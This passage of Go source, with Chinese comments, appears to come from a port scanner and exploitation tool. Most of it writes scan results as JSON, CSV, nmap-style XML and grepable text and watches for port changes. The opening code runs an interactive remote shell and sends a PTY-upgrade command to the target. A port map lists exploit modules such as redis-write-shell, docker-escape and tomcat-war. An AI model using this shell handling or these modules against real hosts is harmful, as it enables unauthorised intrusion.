	_ = conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	var sb strings.Builder
	buf := make([]byte, 8192)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
		}
		if err != nil {
			break
		}
	}
	if sb.Len() > 0 {
		fmt.Print(sb.String())
	}

	// 仅在交互终端下进入交互 shell; 非交互(管道)直接退出
	if !term.IsTerminal(int(os.Stdin.Fd())) {
		fmt.Println("\n[*] 非交互终端, shell 已断开")
		return
	}
	// 本地终端设为 raw 模式: 否则输入需回车才发送、Ctrl+C/方向键失效
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		fmt.Println("[-] 进入 raw 模式失败, 交互可能异常")
	} else {
		defer term.Restore(int(os.Stdin.Fd()), oldState)
	}
	_ = conn.SetReadDeadline(time.Time{})
	// 自动升级 PTY: 让远端 bash 获得 job control, 可运行 vim/top/sudo 等
	_, _ = conn.Write([]byte("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null\n"))
	go func() { _, _ = io.Copy(conn, os.Stdin) }()
	_, _ = io.Copy(os.Stdout, conn)
	fmt.Println("\n[*] shell 已断开")
}

// defaultServicePort 根据服务/模块名返回默认端口
func defaultServicePort(name string) int {
	switch strings.ToLower(name) {
	case "ftp":
		return 21
	case "ssh":
		return 22
	case "telnet":
		return 23
	case "smtp":
		return 25
	case "mysql":
		return 3306
	case "postgresql":
		return 5432
	case "redis", "redis-write-shell":
		return 6379
	case "docker", "docker-escape":
		return 2375
	case "elasticsearch", "es-file-read":
		return 9200
	case "nacos", "nacos-register":
		return 8848
	case "jenkins", "jenkins-script":
		return 8080
	case "tomcat", "tomcat-war":
		return 8080
	}
	return 80
}

// loadDict 从文件加载字典(每行一条), 失败返回 nil(用内置字典)
func loadDict(path string) []string {
	if path == "" {
		return nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "读取字典失败 %s: %v\n", path, err)
		return nil
	}
	var out []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line != "" {
			out = append(out, line)
		}
	}
	return out
}

// ---- 定时扫描 + 变更监控 ----

func runMonitor(f cliFlags) {
	dir := scanner.DefaultStateDir()
	_ = os.MkdirAll(dir, 0o755)
	lockPath := dir + string(os.PathSeparator) + sanitizeName(f.monitor) + ".lock"
	lf, err := os.OpenFile(lockPath, os.O_CREATE|os.O_EXCL, 0o644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "目标 %s 已在监控中(锁文件存在)\n", f.monitor)
		os.Exit(1)
	}
	lf.Close()

	opts := buildOptions(f)
	for {
		results, err := runScan(opts, f)
		if err != nil {
			os.Remove(lockPath)
			fmt.Fprintf(os.Stderr, "扫描失败: %v\n", err)
			os.Exit(1)
		}
		var items []string
		for _, r := range results {
			if r.State == scanner.StateOpen {
				items = append(items, fmt.Sprintf("%s:%d/%s", r.IP, r.Port, r.Protocol))
			}
		}
		added, removed, err := scanner.DiffState(dir, f.monitor, items)
		if err != nil {
			os.Remove(lockPath)
			fmt.Fprintf(os.Stderr, "状态保存失败: %v\n", err)
			os.Exit(1)
		}

		if len(added) > 0 || len(removed) > 0 {
			for _, a := range added {
				fmt.Printf("+ 新增 %s\n", a)
			}
			for _, r := range removed {
				fmt.Printf("- 消失 %s\n", r)
			}
			writeDiffFile(dir, f.monitor, added, removed)
		} else {
			fmt.Println("无变化")
		}

		if f.interval == "" {
			os.Remove(lockPath)
			if len(added) > 0 || len(removed) > 0 {
				os.Exit(10)
			}
			os.Exit(0)
		}
		d, err := time.ParseDuration(f.interval)
		if err != nil || d <= 0 {
			d = 24 * time.Hour
		}
		fmt.Fprintf(os.Stderr, "下次扫描: %s 后\n", d)
		time.Sleep(d)
	}
}

func writeDiffFile(dir, target string, added, removed []string) {
	name := sanitizeName(target)
	path := dir + string(os.PathSeparator) + "changes_" + name + "_" + time.Now().Format("20060102_150405") + ".diff"
	var sb strings.Builder
	for _, a := range added {
		sb.WriteString("+ " + a + "\n")
	}
	for _, r := range removed {
		sb.WriteString("- " + r + "\n")
	}
	if err := os.WriteFile(path, []byte(sb.String()), 0o644); err == nil {
		fmt.Fprintf(os.Stderr, "已写入差异文件: %s\n", path)
	}
}

func sanitizeName(s string) string {
	return strings.NewReplacer("/", "_", ":", "_", "\\", "_", " ", "_", "*", "_", "?", "_").Replace(s)
}

// ---- 输出文件 ----

func writeOutputs(f cliFlags, results []scanner.Result, opts scanner.Options) {
	if f.outJSON != "" {
		writeJSON(f.outJSON, results)
	}
	if f.outXML != "" {
		writeXML(f.outXML, results)
	}
	if f.outGrepable != "" {
		writeGrepable(f.outGrepable, results)
	}
	if f.outNormal != "" {
		writeNormal(f.outNormal, results)
	}
	if f.outCSV != "" {
		writeCSV(f.outCSV, results)
	}
	if f.outHTML != "" {
		if err := scanner.WriteHTMLReport(f.outHTML, strings.Join(opts.Targets, ","), opts.Ports, results); err != nil {
			fmt.Fprintf(os.Stderr, "HTML 报告失败: %v\n", err)
		} else {
			fmt.Fprintf(os.Stderr, "已写入 HTML 报告: %s\n", f.outHTML)
		}
	}
}

func writeJSON(path string, results []scanner.Result) {
	if results == nil {
		results = []scanner.Result{}
	}
	data, err := json.MarshalIndent(results, "", "  ")
	if err != nil {
		fmt.Fprintf(os.Stderr, "JSON 输出失败: %v\n", err)
		return
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "写入 %s 失败: %v\n", path, err)
		return
	}
	fmt.Fprintf(os.Stderr, "已写入 JSON: %s\n", path)
}

func writeCSV(path string, results []scanner.Result) {
	var sb strings.Builder
	sb.WriteString("\xEF\xBB\xBF") // UTF-8 BOM
	sb.WriteString("IP地址,主机名,端口,协议,状态,服务,版本,操作系统\n")
	for _, r := range results {
		if r.State == "up" || r.State == "down" {
			continue
		}
		fmt.Fprintf(&sb, "%s,%s,%d,%s,%s,%s,%s,%s\n",
			r.IP, r.Hostname, r.Port, r.Protocol, r.State, r.Service, r.Version, r.OS)
	}
	if err := os.WriteFile(path, []byte(sb.String()), 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "写入 %s 失败: %v\n", path, err)
		return
	}
	fmt.Fprintf(os.Stderr, "已写入 CSV: %s\n", path)
}

type xmlNmap struct {
	XMLName xml.Name  `xml:"nmaprun"`
	Hosts   []xmlHost `xml:"host"`
}

type xmlHost struct {
	IP    string    `xml:"ip,attr"`
	Ports []xmlPort `xml:"ports>port"`
}

type xmlPort struct {
	Protocol string   `xml:"protocol,attr"`
	PortID   int      `xml:"portid,attr"`
	State    xmlState `xml:"state"`
	Service  xmlSvc   `xml:"service"`
}

type xmlState struct {
	State string `xml:"state,attr"`
}

type xmlSvc struct {
	Name    string `xml:"name,attr"`
	Product string `xml:"product,attr,omitempty"`
	Version string `xml:"version,attr,omitempty"`
}

func writeXML(path string, results []scanner.Result) {
	hostMap := map[string]*xmlHost{}
	for _, r := range results {
		if r.State == "up" || r.State == "down" || r.State == "os" {
			continue
		}
		h, ok := hostMap[r.IP]
		if !ok {
			h = &xmlHost{IP: r.IP}
			hostMap[r.IP] = h
		}
		h.Ports = append(h.Ports, xmlPort{
			Protocol: r.Protocol,
			PortID:   r.Port,
			State:    xmlState{State: string(r.State)},
			Service:  xmlSvc{Name: r.Service, Product: r.Service, Version: r.Version},
		})
	}
	doc := xmlNmap{}
	for _, h := range hostMap {
		doc.Hosts = append(doc.Hosts, *h)
	}
	sort.Slice(doc.Hosts, func(i, j int) bool { return doc.Hosts[i].IP < doc.Hosts[j].IP })

	out, err := xml.MarshalIndent(doc, "", "  ")
	if err != nil {
		fmt.Fprintf(os.Stderr, "XML 输出失败: %v\n", err)
		return
	}
	out = append([]byte(xml.Header), out...)
	if err := os.WriteFile(path, out, 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "写入 %s 失败: %v\n", path, err)
		return
	}
	fmt.Fprintf(os.Stderr, "已写入 XML: %s\n", path)
}

func writeGrepable(path string, results []scanner.Result) {
	hostMap := map[string][]scanner.Result{}
	for _, r := range results {
		if r.State == "up" || r.State == "down" || r.State == "os" {
			continue
		}
		hostMap[r.IP] = append(hostMap[r.IP], r)
	}
	var sb strings.Builder
	for ip, ports := range hostMap {
		sort.Slice(ports, func(i, j int) bool { return ports[i].Port < ports[j].Port })
		var portStrs []string
		for _, p := range ports {
			portStrs = append(portStrs, fmt.Sprintf("%d/%s/%s//%s//%s/", p.Port, p.State, p.Protocol, p.Service, p.Version))
		}
		sb.WriteString(fmt.Sprintf("Host: %s () Ports: %s\n", ip, strings.Join(portStrs, ", ")))
	}
	if err := os.WriteFile(path, []byte(sb.String()), 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "写入 %s 失败: %v\n", path, err)
		return
	}
	fmt.Fprintf(os.Stderr, "已写入 grepable: %s\n", path)
}

func writeNormal(path string, results []scanner.Result) {
	var sb strings.Builder
	for _, r := range results {
		if r.State == "up" {
			sb.WriteString(fmt.Sprintf("%s 主机存活\n", r.IP))
			continue
		}
		if r.State == "down" {
			sb.WriteString(fmt.Sprintf("%s 主机离线\n", r.IP))
			continue
		}
		if r.State == "os" {
			sb.WriteString(fmt.Sprintf("%s 操作系统 %s (%s)\n", r.IP, r.Version, r.OS))
			continue
		}
		svc := r.Service
		if r.Version != "" {
			svc += " " + r.Version
		}
		sb.WriteString(fmt.Sprintf("%-16s %6d/%-3s %-13s %s\n", r.IP, r.Port, r.Protocol, r.State, svc))
	}
	if err := os.WriteFile(path, []byte(sb.String()), 0o644); err != nil {
		fmt.Fprintf(os.Stderr, "写入 %s 失败: %v\n", path, err)
		return
	}
	fmt.Fprintf(os.Stderr, "已写入普通格式: %s\n", path)
}

func splitList(s string) []string {
	return strings.FieldsFunc(s, func(r rune) bool {
		return r == ',' || r == ' ' || r == ';' || r == '\n' || r == '\r'
	})
}
